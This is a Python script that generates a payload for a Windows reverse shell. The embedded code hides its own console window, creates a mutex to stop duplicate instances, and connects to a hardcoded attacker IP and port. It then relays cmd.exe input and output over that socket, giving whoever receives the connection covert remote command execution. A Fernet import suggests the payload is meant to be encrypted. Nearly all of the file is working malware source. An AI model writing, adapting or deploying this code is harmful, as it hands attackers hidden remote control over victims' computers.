from cryptography.fernet import Fernet
from Colors import colors
import Tool_name

your_ip_address = "192.168.0.103"                               #input(">>> Put Your IP Address Here:\t")
your_port_number = "12345"                                      #input(">>> Set Your Port Number Here:\t")
print("\n\n")
print("\033[32m[+] Generating Payload")

payload_string = '''
import os,sys,socket,subprocess,threading,win32gui,win32con,win32event,win32api,winerror

IP = \"'''+ your_ip_address +'''\"                              #Enter your Ip Address

hwnd = win32gui.GetForegroundWindow();                          #finding the handle ID
app_title  = win32gui.GetWindowText(hwnd);                      #give the title of this application window
win32gui.ShowWindow(hwnd, win32con.SW_HIDE);                    #SW_HIDE is used to hide that window

instance = win32event.CreateMutex(None, 1, 'NOSIGN')            #give the <PyHANDLE:value> as instance
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:    #used to check that instance of this application is running or not
    	instance = None
    	sys.exit()

def s2p(s, p):                                                  #server receive some data from process
    while True:
        data = s.recv(1024)                                     #received data with BUFFER_SIZE=10000000000(KB at a time)
        if len(data) > 0:
            p.stdin.write(bytes(data))
            
            
def p2s(s, p):                                                  #process will read some data from the server
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)              #Establish socket object as IPv4 and TCP Protocol
s.connect((IP,'''+ your_port_number +'''))                      #Connecting with My Ip and the selected Port number

p=subprocess.Popen(['\\windows\system32\\cmd.exe'], stderr=subprocess.STDOUT, stdout=subprocess.PIPE, stdin=subprocess.PIPE, bufsize=0)     #new process is generated
 
s2p_thread = threading.Thread(target=s2p, args=[s, p], daemon = True)       
s2p_thread.start()                                              #start s2p_thread with s2p(s, p)

p2s_thread = threading.Thread(target=p2s, args=[s, p], daemon = True)
p2s_thread.start()                                              #start p2s_thread with s2p(s, p)


try:
    p.wait()
except KeyboardInterrupt:                                       #CTRL+C for exit
    s.close()
'''
payload = bytes(payload_string,encoding='ascii')

